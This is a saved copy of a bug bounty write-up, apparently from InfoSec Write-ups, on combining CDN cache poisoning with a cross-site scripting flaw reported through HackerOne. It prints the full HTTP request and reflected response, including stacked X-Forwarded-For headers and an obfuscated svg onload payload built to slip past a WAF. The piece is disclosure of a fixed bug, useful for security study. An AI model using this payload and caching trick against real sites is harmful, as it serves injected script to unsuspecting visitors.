@@ -1,0 +1,18 @@
+---
+title: "How I Made +$16,500 Hacking CDN Caching Servers — Part 2"
+url: "https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6?source=rss-7c6bece313a1------2"
+source: "bombon"
+date: 2022-01-29
+fetched: 2026-05-05
+language: en
+read: false
+archived: false
+tags: []
+---
+
+> [!example] AI 摘要
+> 本文介绍了作者通过缓存投毒（Cache Poisoning）实现隐蔽XSS攻击并获得2000美元赏金的漏洞利用过程：通过在URL末尾添加可缓存扩展名（如.js）绕过CDN缓存限制，结合Cookie注入点与X-Forwarded-For请求头反射特性，成功绕过WAF并注入闭合的<script>标签，实现隐蔽XSS。该漏洞影响某公开漏洞赏金计划，于2021年12月上报，2022年3月修复。
+
+---
+
+<h3>How I Made $16,500 Hacking CDN Caching Servers — Part 2</h3><h4>@bxmbn</h4><figure><img alt="" src="https://cdn-images-1.medium.com/max/610/1*pyZEcnS5fLESc8yUS4wbdA.png" /></figure><h3>A Nice Way To Hide XSS</h3><blockquote><em>Bounty: $2,000</em></blockquote><p>While Google Dorking, i found a particular URL, but this time, was not being cached, but if i added an cacheable extension file (.js , .css) at the end of URL, it would cache the response.</p><p>Now, all i needed was to found a XSS. I found an injection point on a Cookie, but WAF would trigger when i added anything after %20</p><pre>Cookie: cookiename=xss&lt;/script%20</pre><p>While trying to bypass the WAF, I realized that my IP was also being reflected on that same script..</p><pre>guid=&quot;&lt;/script &quot;,&quot;24.99.19.20&quot;</pre><p>Since my IP was being reflected, I tried “X-Forwarded-For” Headers, this way i can close the &lt;script&gt; and avoid WAF, as it would trigger if it detected &lt;[anything]&gt;</p><p>This is why you will see 3 “X-Forwarded-For” Headers</p><h4>Request:</h4><pre>GET /xxx/xx/xxx.xx/x.js?t=2021111121 HTTP/2 <br />Host: Redacted<br />X-Forwarded-For: xss <br />X-Forwarded-For: xss&gt;&lt;svg/onload=globalThis[`al`+/ert/.source]`1`// X-Forwarded-For: &gt; <br />Cookie: gdId=xss&lt;/script%20</pre><h4>Response:</h4><pre>...<br />guid=&quot;&lt;/script &quot;,&quot;24.99.19.20&quot;,&quot;xss&quot;,&quot;xss&gt;&lt;svg/onload=globalThis[`al`+/ert/.source]`1`//,&quot;&gt;<br />...</pre><p>After Poisoned an URL with an XSS, an attacker just needed to send it to the victim</p><pre>redacted.com/xxx/xx/xxx.xx/x.js?t=2021111121</pre><p>A nice way to hide XSS :D</p><p>This was my favorite Cache Poisoning, and it was found on a Public Program</p><p><a href="https://hackerone.com/reports/1424094">https://hackerone.com/reports/1424094</a></p><h3>Timeline:</h3><blockquote>Reported → December 11, 2021</blockquote><blockquote>Triaged → December 14, 2021</blockquote><blockquote>Bounty Awarded → January 7, 2022</blockquote><blockquote>Fixed → March 7, 2022</blockquote><h3>Next:</h3><p>Part 3: Cache Poisoning DoS Via X-Forwarded-Scheme Header</p><h3>🔈 🔈 Infosec Writeups is organizing its first-ever virtual conference and networking event. If you’re into Infosec, this is the coolest place to be, with 16 incredible speakers and 10+ hours of power-packed discussion sessions. <a href="https://iwcon.live/">Check more details and register here.</a></h3><p><a href="https://iwcon.live/">IWCon2022 - Infosec WriteUps Virtual Conference</a></p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=4995ece4c6e6" width="1" /><hr /><p><a href="https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6">How I Made +$16,500 Hacking CDN Caching Servers — Part 2</a> was originally published in <a href="https://infosecwriteups.com">InfoSec Write-ups</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
